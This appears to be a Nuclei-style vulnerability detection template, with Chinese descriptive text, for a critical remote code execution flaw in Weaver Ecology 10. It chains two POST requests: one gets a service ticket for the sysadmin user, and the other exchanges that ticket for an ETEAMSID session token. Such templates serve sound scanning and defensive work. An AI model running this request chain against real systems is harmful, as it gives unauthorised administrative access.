id: weaver-ecology10-rce
info:
  name: 泛微 Ecology 10 - 远程代码执行漏洞
  author: secking
  severity: critical
  description: |
    该模板用于检测 泛微 Ecology 10 - 远程代码执行漏洞。该类漏洞通常与危险接口暴露、命令参数拼接、模板解析、反序列化或组件缺陷有关，攻击者可能让服务端执行非预期代码。模板会向 `/papi/passport/rest/appThirdLogin?username=sysadmin&service=1&ip=1&loginType=third`、`/papi/passport/login/generateEteamsId?stTicket={{serviceticketid}}` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可在目标服务权限范围内执行命令或代码，进而接管应用所在主机。
    - 成功利用后可能泄露配置、密钥和业务数据，并为横向移动、持久化控制或破坏业务提供入口。
  remediation: |
    - 升级受影响产品或组件到厂商修复版本，移除存在已知缺陷的依赖。
    - 限制高危接口的公网访问，增加认证、授权和来源校验，并避免将用户输入传入命令执行、模板解析或反序列化流程。
    - 排查异常进程、计划任务、WebShell、外联连接和新增账号，必要时轮换凭据并重建受影响环境。
  metadata:
    verified: true
    max-request: 2
    vuln-id: CT-1425994
    vendor: weaver
    product: ecology10
  tags: rce,vuln,weaver,ecology10,oa
flow: http(1) && http(2)
http:
- method: POST
  path:
  - '{{BaseURL}}/papi/passport/rest/appThirdLogin?username=sysadmin&service=1&ip=1&loginType=third'
  redirects: false
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - type: dsl
    dsl:
    - 'status_code == 200 && contains(body, "\"serviceTicketId\"") && contains(body, "\"success\":\"true\"")'
    internal: true
  extractors:
  - type: regex
    name: serviceticketid
    part: body
    group: 1
    regex:
    - 'serviceTicketId\":\"(.+?)\"'
    internal: true
- method: POST
  path:
  - '{{BaseURL}}/papi/passport/login/generateEteamsId?stTicket={{serviceticketid}}'
  redirects: false
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - type: dsl
    dsl:
    - 'status_code == 200 && contains(body, "\"status\":true") && contains(body, "\"data\":")'
    internal: true
  extractors:
  - type: regex
    name: ETEAMSID
    part: body
    group: 1
    regex:
    - 'data\":\"(.+?)\"'
    internal: true
